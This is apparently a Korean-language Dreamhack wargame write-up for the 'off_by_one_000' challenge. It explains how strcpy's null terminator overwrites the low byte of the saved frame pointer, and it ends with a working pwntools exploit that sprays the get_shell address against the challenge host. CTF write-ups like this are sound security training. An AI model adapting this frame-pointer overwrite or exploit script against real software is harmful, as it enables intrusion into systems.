---
title: "off_by_one_000 writeup"
date: 2026-03-21 02:30:00 +0900
categories: [Wargame, Dreamhack]
tags: [pwn, off_by_one, sfp_overwrite, dreamhack]
---

`strcpy`의 동작을 오해하고 있어서 예상보다 시간이 좀 걸린 문제다.

## Analysis

### checksec

```
Arch:       i386-32-little
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x8048000)
Stripped:   No
```

카나리가 없고 PIE도 꺼져 있다.

### Source Code

```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
#include <string.h>

char cp_name[256];

void get_shell()
{
    system("/bin/sh");
}

void alarm_handler()
{
    puts("TIME OUT");
    exit(-1);
}

void initialize()
{
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}

int cpy()
{
    char real_name[256];
    strcpy(real_name, cp_name);
    return 0;
}

int main()
{
    initialize();
    printf("Name: ");
    read(0, cp_name, sizeof(cp_name));

    cpy();

    printf("Name: %s", cp_name);

    return 0;
}
```

`main`에서 `cp_name`(전역 버퍼, 256바이트)에 최대 256바이트를 읽어 들인 후, `cpy`에서 `strcpy`로 지역 버퍼 `real_name`(256바이트)에 복사한다.

## Vulnerability Analysis

`strcpy`는 복사 완료 후 `dest`에 반드시 널 문자(`\0`)를 삽입한다.

따라서 256바이트를 꽉 채워 전송하면, `cpy`의 스택 프레임에 저장된 `main`의 SFP 하위 1바이트가 `0x00`으로 덮어쓰인다. 이는 `main`의 SFP가 기존 값보다 최대 255만큼 낮은 주소를 가리킬 수 있음을 의미한다.

첨부된 바이너리는 스택이 4바이트 단위로 정렬되므로, 실제로 가능한 하위 1바이트 값은 `0x00`, `0x04`, `0x08`, ... 처럼 4의 배수만 존재한다. 따라서 기존 SFP의 하위 1바이트가 `0x00`, `0x04`, `0x08`, `0x0C` 중 하나였다면, 덮어쓰인 주소는 `cpy`에 선언된 `real_name` 버퍼에 도달하지 못한다. 전체 64가지 경우의 수 중 4가지가 실패하므로, 1/16의 확률로 익스플로잇이 실패할 수 있다.

또한 환경 변수 등의 차이로 인해 절대적인 스택 주소는 실행 환경마다 달라질 수 있다. `cpy` 스택 프레임에 저장된 SFP의 하위 1바이트는 항상 `0x00`으로만 덮어쓸 수 있으므로, 원래 하위 1바이트 값에 따라 `real_name` 버퍼와의 거리가 달라진다.

따라서 페이로드 전송 시 이 점에 유의해야 한다. GDB에서 직접 오프셋을 계산하는 대신, 페이로드 전체를 `get_shell` 주소로 채우고 1/16의 확률에 의존해야 한다.

## Exploit

```python
#!/usr/bin/env python3
from pwn import *

exe = ELF("./off_by_one_000")
context.binary = exe

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("host8.dreamhack.games", 13533)
    return r

def main():
    r = conn()

    payload = p32(exe.symbols["get_shell"]) * 64

    r.sendafter(b"Name: ", payload)
    r.interactive()

if __name__ == "__main__":
    main()
```